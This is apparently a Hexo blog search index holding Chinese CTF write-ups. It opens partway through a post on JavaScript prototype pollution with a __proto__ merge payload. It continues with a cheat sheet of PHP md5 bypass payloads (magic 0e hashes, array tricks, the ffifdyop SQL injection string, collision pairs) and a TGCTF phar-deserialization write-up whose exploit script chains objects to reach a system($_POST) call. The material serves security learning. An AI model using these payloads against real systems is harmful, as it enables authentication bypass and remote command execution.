构造函数function也属于Object 如果对这里为什么属于Object而不属于Function有疑问请继续阅读 下面会解释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="污染前置知识"><a href="#污染前置知识" class="headerlink" title="污染前置知识"></a>污染前置知识</h5><p>既然是通过实例化Object来创建对象或创建构造函数，在JavaScript中有两个很特殊的对象，Function() 和 Object() ，它们两个既是构造函数也是对象，作为对象是不是应该有一个“类”去作为他们的模板呢？</p><p>对于Object()来说，要声明这么一个构造函数我们可以使用关键字function来创建 。（在底层 使用function创建一个函数 其实就相当于这个过程）</p><pre class="line-numbers language-language-python"><code class="language-language-python">function Object(){    }在底层为var Object = new Function();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先引入一些概念方便理解以下的讲解</p><p><strong><strong>proto</strong><strong>是任何一个</strong>对象</strong>拥有的属性</p><p><strong>prototype</strong>是任何一个<strong>函数</strong>拥有的一个属性</p><p>那么对于Function自己这个对象，他是怎么来的呢？如果用<strong>Function.<strong>proto</strong><strong>和</strong>Function.prototype</strong>进行比较，发现<strong>二者是全等</strong>的，所以Function创造了自己，也创造了Object，所以JavaScript中，<strong>所有函数都是对象，而对象是通过函数创建的</strong>。因此</p><p><strong>构造函数.prototype.__proto__应该是Object.prototype，而不是Function.prototype，Function的作用是创建而不是继承。</strong></p><p><strong>eg;</strong></p><p><strong>person=….</strong></p><p>这个person对象就拥有了<strong>person.<strong>proto</strong><strong>这个属性，而Object()我们刚才提到了是由Function创建来的一个构造函数，那么Object就天生有了</strong>Object.prototype。</strong></p><p>为什么要说这些呢就是为了说明白</p><p>1.某一对象的__proto__指向它的prototype（原型对象）， 也就是说如果</p><p><strong>直接访问person.<strong>proto</strong> 那么就相当于访问了Object.prototype。</strong></p><p>2.JavaScript使用prototype链实现继承机制。</p><p>3.构造函数xxx.prototype是一个对象，xxx.prototype也有自己的__proto__属性，并且可以继续指向它的的prototype。</p><p>4.Object.prototype.proto最终指向null，这也是所有原型链的终点。</p><p>5.从一个对象的__proto__不断向上指向原型对象，最终指向Objecct.prototype后，接着指向为Null，这一条链子就叫做原型链。</p><h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a><strong>例子</strong></h6><p>这么长的文章也是讲的略显抽象，我们来个例子便于理解</p><pre class="line-numbers language-language-python"><code class="language-language-python">function Father() {    this.first_name = 'Donald'    this.last_name = 'Trump'}function Son() {    this.first_name = 'Melania'}Son.prototype = new Father()let son = new Son()console.log(`Name: ${son.first_name} ${son.last_name}`)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上边的例子中（下边语言非正式完全准确，为个人总结便于理解，以待不断改正）</p><p>son.__proto__就指向了Son.prototype</p><p><strong>直接访问对象.<strong>proto</strong> 那么就相当于访问了构造函数.prototype。注意对于第一种的实例方法（没构造函数换句话说构造方法就是Object）会指向Object.prototype</strong></p><p>Son.prototype.__proto__指向father.prototype</p><p><strong>Son.prototype = new Father()+上一条理解</strong></p><p>father.prototype.__proto__指向Object.prototype</p><p><strong>构造函数.prototype.__proto__应该是Object.prototype</strong></p><p>Object.prototype.proto指向null</p><p><strong>Object.prototype.proto最终指向null，这也是所有原型链的终点。</strong></p><p>我们在简单引入一下程序运行过程，以理解原型链污染の原理</p><p>对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li><font style="color:rgb(0, 0, 0);">在对象son中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">如果找不到，则在son.__proto__中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">如果仍然找不到，则继续在son.<strong>proto</strong>.__proto__中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">依次寻找，直到找到null结束。</font></li></ol><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a><strong>原型链污染</strong></h1><p>ok，前置知识基本已经明了，我们直接上例子来理解污染</p><pre class="line-numbers language-language-python"><code class="language-language-python">// 这个对象直接实例化Object()let foo = {bar: 1}// foo.bar 此时为1console.log(foo.bar)// 修改foo的原型（即Object）foo.__proto__.bar = 2// 由于查找顺序的原因，foo.bar仍然是1console.log(foo.bar)// 此时再用Object创建一个空的zoo对象let zoo = {}// 查看zoo.barconsole.log(zoo.bar)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里由于修改了foo.<strong>proto</strong>.bar 也就是修改了Object.bar，因此在后续的实例化对象中，新的对象会继承这一属性 造成了原型链污染。</p><p>但是上边很显然是我们自己的实验过程，在ctf中什么情况可以使用呢</p><p>和python原型链污染类似，有合并函数对象merge，对象clone（其实内核就是将待操作的对象merge到一个空对象中），再举一个伪ctf的例子</p><p>eg：</p><pre class="line-numbers language-language-python"><code class="language-language-python">function merge(target, source) {    for (let key in source) {        if (key in source && key in target) {              // 如果target与source有相同的键名 则让target的键值为source的键值            merge(target[key], source[key])        } else {            target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值        }    }}let o1 = {}let o2 = {a: 1, "__proto__": {b: 2}}merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)//1 2//undefined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font style="color:rgb(43, 144, 91);">// 如果target与source没有相通的键名 则直接在target新建键名并赋给键值</font></p><p>这里的__proto__被当作普通建值处理了，merge(o1, o2) 的执行相当于再o1新建merge(o1, o2) 的执行相当于也就是o1变成了**{a: 1, “<strong>proto</strong>“: {b: 2}}**</p><p>原型对象Object并没有被更改</p><p>我么稍作更改把o2以json格式传递来确保__proto__不被当做普通键值</p><pre class="line-numbers language-language-python"><code class="language-language-python">let o1 = {}let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)//1 2//2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font style="color:rgb(43, 144, 91);">// 如果target与source有相同的键名 则让target的键值为source的键值 merge(target[key], source[key])</font></p><p>这里等于 merge(Object.prototype, b: 2)，把<strong>所有对象的原型都污染了，<strong>o1变成了</strong>{a:1,b: 2}</strong></p><h1 id="深入理解-JavaScript-Prototype-污染攻击"><a href="#深入理解-JavaScript-Prototype-污染攻击" class="headerlink" title="深入理解 JavaScript Prototype 污染攻击"></a><strong>深入理解 JavaScript Prototype 污染攻击</strong></h1><p>以上内容过于复杂繁琐，我这里引用一下p神及其简洁的总结</p><ol><li><font style="color:rgb(0, 0, 0);">每个构造函数(constructor)都有一个原型对象(prototype)</font></li><li><font style="color:rgb(0, 0, 0);">对象的__proto__属性，指向类的原型对象prototype</font></li><li><font style="color:rgb(0, 0, 0);">JavaScript使用prototype链实现继承机制</font></li></ol>]]></content>
      
      
      <categories>
          
          <category> 原型链污染，nodejs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> nodejs原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5整理</title>
      <link href="/2025/04/16/md5/"/>
      <url>/2025/04/16/md5/</url>
      
        <content type="html"><![CDATA[<p>md5的常规payload整理，如有错误，请佬指出</p><h1 id="一-md5弱比较比较"><a href="#一-md5弱比较比较" class="headerlink" title="一.md5弱比较比较"></a>一.md5弱比较比较</h1><h2 id="1-0e绕过"><a href="#1-0e绕过" class="headerlink" title="1.0e绕过"></a>1.0e绕过</h2><p>部分字符串经过md5加密之后为0exxxx的格式，相当于0的xxxx次方，所以无论xxxx是什么，函数判断时</p><p>会认为相等。</p><p>例如</p><p>a=QNKCDZO,加密后为0e830400451993494058024219903391</p><p>b=240610708,加密后为0e462097431906509019562988736854</p><p>所以既满足了a!=b，也满足了md5($ a) == md5( $b），即可绕过</p><p>这里附上常见的0E开头的MD5<br>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s532378020a<br>0e220463095855511507588041205815<br>s1665632922a<br>0e731198061491163073197128363787<br>s1184209335a<br>0e072485820392773389523109082030<br>s1885207154a<br>0e509367213418206700842008763514<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>详细<br>//数字字母<br>s878926199a 0e545993274517709034328855841020<br>s155964671a 0e342768416822451524974117254469<br>s214587387a 0e848240448830537924465865611904<br>s214587387a 0e848240448830537924465865611904<br>s878926199a 0e545993274517709034328855841020<br>s1091221200a 0e940624217856561557816327384675<br>s1885207154a 0e509367213418206700842008763514<br>s1502113478a 0e861580163291561247404381396064<br>s1885207154a 0e509367213418206700842008763514<br>s1836677006a 0e481036490867661113260034900752<br>s155964671a 0e342768416822451524974117254469<br>s1184209335a 0e072485820392773389523109082030<br>s1665632922a 0e731198061491163073197128363787<br>s1502113478a 0e861580163291561247404381396064<br>s1836677006a 0e481036490867661113260034900752<br>s1091221200a 0e940624217856561557816327384675<br>s155964671a 0e342768416822451524974117254469<br>s1502113478a 0e861580163291561247404381396064<br>s155964671a 0e342768416822451524974117254469<br>s1665632922a 0e731198061491163073197128363787<br>s155964671a 0e342768416822451524974117254469<br>s1091221200a 0e940624217856561557816327384675<br>s1836677006a 0e481036490867661113260034900752<br>s1885207154a 0e509367213418206700842008763514<br>s532378020a 0e220463095855511507588041205815<br>s878926199a 0e545993274517709034328855841020<br>s1091221200a 0e940624217856561557816327384675<br>s214587387a 0e848240448830537924465865611904<br>s1502113478a 0e861580163291561247404381396064<br>s1091221200a 0e940624217856561557816327384675<br>s1665632922a 0e731198061491163073197128363787<br>s1885207154a 0e509367213418206700842008763514<br>s1836677006a 0e481036490867661113260034900752<br>s1665632922a 0e731198061491163073197128363787<br>s878926199a 0e545993274517709034328855841020<br>//数字<br>240610708 0e462097431906509019562988736854<br>314282422 0e990995504821699494520356953734<br>571579406 0e972379832854295224118025748221<br>903251147 0e174510503823932942361353209384<br>1110242161 0e435874558488625891324861198103<br>1320830526 0e912095958985483346995414060832<br>1586264293 0e622743671155995737639662718498<br>2302756269 0e250566888497473798724426794462<br>2427435592 0e067696952328669732475498472343<br>2653531602 0e877487522341544758028810610885<br>3293867441 0e471001201303602543921144570260<br>3295421201 0e703870333002232681239618856220<br>3465814713 0e258631645650999664521705537122<br>3524854780 0e507419062489887827087815735195<br>3908336290 0e807624498959190415881248245271<br>4011627063 0e485805687034439905938362701775<br>4775635065 0e998212089946640967599450361168<br>4790555361 0e643442214660994430134492464512<br>5432453531 0e512318699085881630861890526097<br>5579679820 0e877622011730221803461740184915<br>5585393579 0e664357355382305805992765337023<br>6376552501 0e165886706997482187870215578015<br>7124129977 0e500007361044747804682122060876<br>7197546197 0e915188576072469101457315675502<br>7656486157 0e451569119711843337267091732412<br>//字母<br>QLTHNDT 0e405967825401955372549139051580<br>QNKCDZO 0e830400451993494058024219903391<br>EEIZDOI 0e782601363539291779881938479162<br>TUFEPMC 0e839407194569345277863905212547<br>UTIPEZQ 0e382098788231234954670291303879<br>UYXFLOI 0e552539585246568817348686838809<br>IHKFRNS 0e256160682445802696926137988570<br>PJNPDWY 0e291529052894702774557631701704<br>ABJIHVY 0e755264355178451322893275696586<br>DQWRASX 0e742373665639232907775599582643<br>DYAXWCA 0e424759758842488633464374063001<br>GEGHBXL 0e248776895502908863709684713578<br>GGHMVOE 0e362766013028313274586933780773<br>GZECLQZ 0e537612333747236407713628225676<br>NWWKITQ 0e763082070976038347657360817689<br>NOOPCJF 0e818888003657176127862245791911<br>MAUXXQC 0e478478466848439040434801845361<br>MMHUWUV 0e701732711630150438129209816536 </p><h2 id="2-数组绕过"><a href="#2-数组绕过" class="headerlink" title="2.数组绕过"></a>2.数组绕过</h2><p>a[]=&amp;b[]=2</p><h1 id="二-双重md5下的0e绕过"><a href="#二-双重md5下的0e绕过" class="headerlink" title="二.双重md5下的0e绕过"></a>二.双重md5下的0e绕过</h1><p><strong>7r4lGXCH2Ksu2JNT3BYM</strong></p><p><strong>CbDLytmyGm2xQyaLNhWn</strong></p><p><strong>770hQgrBOjrcqftrlaZk</strong><br>双MD5的：</p><p><strong>V5VDSHva7fjyJoJ33IQl</strong></p><p>md5(“V5VDSHva7fjyJoJ33IQl”) =&gt; 0e18bb6e1d5c2e19b63898aeed6b37ea</p><p>md5(“0e18bb6e1d5c2e19b63898aeed6b37ea”) =&gt; 0e0a710a092113dd5ec9dd47d4d7b86f</p><p><strong>CbDLytmyGm2xQyaLNhWn</strong></p><p>md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</p><p>md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af</p><p><strong>770hQgrBOjrcqftrlaZk</strong></p><p>md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625</p><p>md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064</p><p><strong>7r4lGXCH2Ksu2JNT3BYM</strong></p><p>md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849</p><p>md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</p><h1 id="三-md5强比较"><a href="#三-md5强比较" class="headerlink" title="三.md5强比较"></a>三.md5强比较</h1><p>md5函数无法处理数组，也就是如果把a、b变成两个数组传入变量时，可以绕过md5</p><p>例如</p><p>a[]=1&amp;b[]=2</p><p>既满足a!=b，也可以绕过md5()函数</p><h1 id="四-sql之md5-password-ture"><a href="#四-sql之md5-password-ture" class="headerlink" title="四.sql之md5($password,ture)"></a>四.sql之md5($password,ture)</h1><p>输入<font style="color:rgb(243, 50, 50);">ffifdyop</font>，后端的SQL语句会变成：</p><p><em><strong><font style="color:rgb(0, 0, 0);">select * from <code>admin</code> where password=</font></strong><strong><strong><font style="color:rgb(243, 50, 50);">‘’or’6’ </font></strong></strong><strong><font style="color:rgb(0, 0, 0);"> —&gt; True</font></strong></em></p><h1 id="五-加密后弱相等-a-md5-a"><a href="#五-加密后弱相等-a-md5-a" class="headerlink" title="五.加密后弱相等$a==md5($a)"></a>五.加密后弱相等$a==md5($a)</h1><p>形式如下：</p><pre class="line-numbers language-language-python"><code class="language-language-python">if ($md5==md5($md5))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 可以找0e开头并且md5后仍然0e开头的字符串。</p><p> 这里可以用0e215962017</p><h1 id="六-碰撞"><a href="#六-碰撞" class="headerlink" title="六.碰撞"></a>六.碰撞</h1><p>真实碰撞对（md5值）</p><p>eg：</p><p>0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</p><p>和0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</p><p>两组经过url编码后的值:</p><p><strong>#1</strong></p><p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p><p>b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><p><strong>#2</strong></p><p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p><p>b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</p><p><strong>#3</strong></p><p>$a=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;</p><p>$b=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;</p><h1 id="七-变量转换为字符串md5强相等绕过方法"><a href="#七-变量转换为字符串md5强相等绕过方法" class="headerlink" title="七.变量转换为字符串md5强相等绕过方法"></a>七.变量转换为字符串md5强相等绕过方法</h1><p>字符串不相等，md5的强类型相等</p><pre class="line-numbers language-language-python"><code class="language-language-python">string($a)!=string($b),md5($a)===md5($b)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;=&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;=</p><h1 id="八-上传的参数字符串且md5弱相等"><a href="#八-上传的参数字符串且md5弱相等" class="headerlink" title="八.上传的参数字符串且md5弱相等"></a>八.上传的参数字符串且md5弱相等</h1><pre class="line-numbers language-language-python"><code class="language-language-python">if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2']))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>科学法绕过</p><p>s878926199a</p><p>s155964671a</p><h1 id="九-NaN-和-INF"><a href="#九-NaN-和-INF" class="headerlink" title="九.NaN 和 INF"></a>九.NaN 和 INF</h1><p>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN===NAN都是false，但md5(‘NaN’)===md5(‘NaN’)为true</p><h1 id="十-HASH长度扩展攻击"><a href="#十-HASH长度扩展攻击" class="headerlink" title="十.HASH长度扩展攻击"></a>十.HASH长度扩展攻击</h1><p>前提条件</p><p>1.$a的MD5(**<u>09</u>**<strong>8f6bcd4621d373cade4e832627b4f6</strong>)</p><p>2.$a的长度=<strong>4</strong></p><p>3.$b我们可以任意控制<br>示例代码：</p><pre class="line-numbers language-language-python"><code class="language-language-python">if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) {    echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不多赘述了直接利用<strong>hashpump工具来获得payoad</strong></p>]]></content>
      
      
      <categories>
          
          <category> 归纳整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> md5比较 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/16/hello-world/"/>
      <url>/2025/04/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>YUNiversity测试</p><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化漏洞</title>
      <link href="/2025/04/16/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/16/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>在打tgctf的时候碰到了文件上传+phar反序列化组合拳，之前有所了解但并没有掌握，趁复现好好的学习一下</p><p>先放上tg的源码</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phphighlight_file(__FILE__);error_reporting(0);function best64_decode($str){    return base64_encode(md5(base64_encode(md5($str))));    }class yesterday {    public $learn;    public $study="study";    public $try;    public function __construct()    {        $this->learn = "learn<br>";    }    public function __destruct()    {        echo "You studied hard yesterday.<br>";        return $this->study->hard();    }}class today {    public $doing;    public $did;    public $done;    public function __construct(){        $this->did = "What you did makes you outstanding.<br>";    }    public function __call($arg1, $arg2)    {        $this->done = "And what you've done has given you a choice.<br>";        echo $this->done;        if(md5(md5($this->doing))==666){            return $this->doing();        }        else{            return $this->doing->better;        }    }}class tommoraw {    public $good;    public $bad;    public $soso;    public function __invoke(){        $this->good="You'll be good tommoraw!<br>";        echo $this->good;    }    public function __get($arg1){        $this->bad="You'll be bad tommoraw!<br>";    }}class future{    private $impossible="How can you get here?<br>";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __set($arg1, $arg2) {        if ($this->out->useful7) {            echo "Seven is my lucky number<br>";            system('whoami');        }    }    public function __toString(){        echo "This is your future.<br>";        system($_POST["wow"]);        return "win";    }    public function __destruct(){        $this->no = "no";        return $this->no;    }}if (file_exists($_GET['filename'])){    echo "Focus on the previous step!<br>";}else{    $data=substr($_GET['filename'],0,-4);    unserialize(best64($data));}// You learn yesterday, you choose today, can you get to your future??><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比较明显的特征就是无法正常进行反序列化(不可逆的md5加密)且存在文件上传的途径（这里没有放文件上传的源码）</p><p>我们先引入phar反序列化的概念</p><blockquote><p><strong>PHAR反序列化漏洞</strong>是与PHP中的对象反序列化相关的一种安全漏洞，特别是在处理PHAR文件时可能被利用。</p><p>概念解释：</p><p>PHAR文件：</p><p>PHAR 是一种类似于ZIP或TAR的归档格式，但它专门为PHP应用程序设计。一个PHAR文件可以包含PHP文件、图片、配置等内容，可以直接在PHP环境中执行。</p><p>PHAR反序列化漏洞： PHAR文件可以存储序列化的PHP对象。在某些情况下，PHP内置函数如file_exists()、is_file()等文件操作函数可以被用于处理包含PHAR存档的路径。例如，如果一个应用程序在未预期的情况下处理到PHAR文件并通过反序列化机制读取该文件，攻击者可以构造恶意的PHAR文件，使PHP反序列化攻击得以执行。</p></blockquote><p>对于晦涩的概念我向来无感，这里直接给上一个phar包(和jar包差不多)</p><p>比较重要的就是你要新建了一个类，还有一个就是setMetadata，这是核心</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phphighlight_file(_FILE_);class Destiny{  public $he_say;}@unlink(filename:'test-phar');//删除之前的test-phar文件（如果存在)$phar=new Phar(filename:'test.phar');//创建一个Phar对象，文件名必须以phar为后缀，生成后可以随意修改$phar->startBuffering()；//开始写入文件$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 写入 stub$o = new Dest1ny();//这个是链子也可以放在 @前面$phar->setMetadata($o)；//写入元数据$phar->addFromString(localName:"test.txt",contents:"test"); //添加要压缩的文件$phar->stopBuffering（）；//停止写入文件并完成压缩?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看我的注释就很好明白，把链子当作元数据生成phar压缩文件传入后配合phar来进行反序列化（大概的流程就是这样）</p><p>那么tg的payload也就很好写出，只需要改一下链子</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phpclass yesterday {     public $learn;     public $study;     public $try;}class today {     public $doing;}class future{     }$y = new yesterday();$y-> study = new today();$y->study->doing=new future();@unlink("phar.phar");$phar = new Phar("phar.phar"); //后缀名必须为phar，生成后可以随意修改$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub$phar->setMetadata($y); //将自定义的meta-data存入manifest$phar->addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算$phar->stopBuffering();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接运行，这边报错的话，需要改一下php.ini里的readonly，把ON改成OFF  </p><p><img src="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png"></p><p>第一个红框是文件头，第二个红框是setMetadata，而且如果php文件里有读取文件的函数，他一定会把setMetadata里的内容反序列化。</p><p><img src="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png"></p><p>更改后缀他的文件头是不变的，所以可以修改成任意的后缀（生成之后）</p>]]></content>
      
      
      <categories>
          
          <category> 序列化与反序列化 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> phar+文件上传 </tag>
            
            <tag> tgctf2025 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
